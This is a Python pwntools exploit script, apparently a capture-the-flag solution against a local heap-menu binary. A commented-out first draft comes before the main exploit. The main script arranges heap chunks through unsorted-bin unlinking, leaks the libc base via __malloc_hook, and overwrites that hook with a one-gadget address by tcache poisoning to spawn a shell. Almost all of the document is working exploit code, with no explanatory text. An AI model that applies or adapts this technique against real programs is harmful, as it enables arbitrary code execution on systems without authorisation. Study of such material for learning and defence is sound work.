'''
from pwn import *
context.arch = 'amd64'

io = process("./source")
def sl(d):
    io.sendlineafter("> ",d)
def s(d):
    io.sendafter("> ",d)
def alloc(size,data):
    sl("1")
    s(str(size))
    s(data)
def free(index):
    sl("2")
    s(str(index))
def puts(index):
    sl("3")
    s(str(index))

for i in range(8):
    alloc(0xf8,'/bin/sh;\0')
    sleep(0.2)
for i in range(3,8):
    free(i)
    sleep(0.2)
io.interactive()
free(0)
free(1)
free(2)

io.interactive()
'''
from pwn import *
from time import sleep

context.arch = 'amd64'
elf = ELF('source')
lib = ELF('libc64.so')

r = process('./source')

def alloc(size,data):
    r.sendlineafter('command?\n> ','1')
    r.sendlineafter('> ',str(size))
    r.sendlineafter('> ',data)
def delete(index):
    r.sendlineafter('command?\n> ','2')
    r.sendlineafter('> ',str(index))
def puts(index):
    r.sendlineafter('command?\n> ','3')
    r.sendlineafter('> ',str(index))

for i in range(10):
    alloc(0xf7,str(i)*8)
sleep(0.1)
delete(9)
delete(8)
delete(7)
delete(6)
delete(5)
delete(3)
delete(1)
delete(4)#ub
delete(2)#ub 0x500
delete(0)#ub
#0x300 0x500 0x700 -> unsorted bin -> generate valid fd & bk
for i in range(10):
    alloc(8,'\x00')
sleep(0.1)
delete(0)
delete(2)
delete(3)
delete(4)
delete(9)#tc
delete(8)#tc
delete(7)#tc
delete(1)
#0x600 -> unsorted bin -> allow valid combinition
alloc(8,'\x00')
alloc(248,'\x00')
for i in range(5):
    alloc(8,'\x00')
alloc(8,'\x00')

delete(3)
delete(4)
delete(5)
delete(6)
delete(7)
delete(8)
delete(2)

delete(9)#0x600
log.success('UNLINK DONE')

puts(1)
leak0 = u64(r.recv(6).ljust(8,'\x00'))
libase = leak0 - (lib.symbols['__malloc_hook']+0x10) - 96 #0x3b0c80
log.info('LIBC BASE -> '+str(hex(libase)))
# 1 & 9 both point to 0x500

for i in range(8):
    alloc(8,str(i)*8)
delete(2)
delete(3)
delete(4)
delete(5)
delete(1)
delete(9)
alloc(8,'AAAAAAA')
alloc(8,'BBBBBBB')
delete(1)
delete(2)
alloc(8,p64(libase+lib.symbols['__malloc_hook']))
alloc(8,'AAAA')
alloc(8,p64(libase+0x10a38c))
log.success('TCACHE POISONING DONE')
r.sendlineafter('command?\n> ','1')
r.interactive()
